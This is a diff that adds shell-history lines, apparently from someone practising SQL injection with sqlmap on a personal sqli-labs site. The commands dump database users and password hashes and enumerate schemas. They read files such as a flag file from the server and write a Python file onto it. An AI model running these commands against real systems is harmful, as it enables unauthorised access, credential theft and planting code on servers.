@@ -128,6 +128,47 @@
   487  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-33/?id=1"  --dbms mysql -dbs --thread 10 --tamper="unmagicquotes.py" -v 3 --batch
   488  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-33/?id=1"  --dbms mysql  --thread 10 --tamper="unmagicquotes.py" -v 3 --batch  -D "xiaoxiaoran" --tables
 	
+  131  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --banner
+  132  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --current-user
+  134  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --current-db
+  135  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --hostname
+  136  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --is-dba
+  137  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --users
+  138  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --passwd
+  139  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --pasword
+  140  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --password
+  141  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --password -v3
+  142  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --schema
+  143  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --technique U --schema --count
+  144  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" -D xiaoxiaoran --common-tables -v3
+  145  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --file-read="F:\\flag.txt"
+  146  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --file-read="F:\\1.txt"
+  147  cat /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com
+  148  cat /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/target.txt
+  149  cat /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/log
+  150  cat /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/
+  151  cat /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/files
+  152  cat /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/files/1.txt
+  153  tree /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/files
+  154  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --file-read="F:\\1.txt"
+  155  tree /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/files
+  156  tree /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com
+  157  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --file-read="E:\\1.txt"
+  158  tree /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com
+  159  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --file-read="E:/1.txt"
+  160  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --file-read="D:\\Temp\\1.txt"
+  161  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --file-write="/home/xiaoxiaoran/xiao/python/xiao.py" --file-dest="D:\\1.py"
+  162  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" -a
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
 
 
 
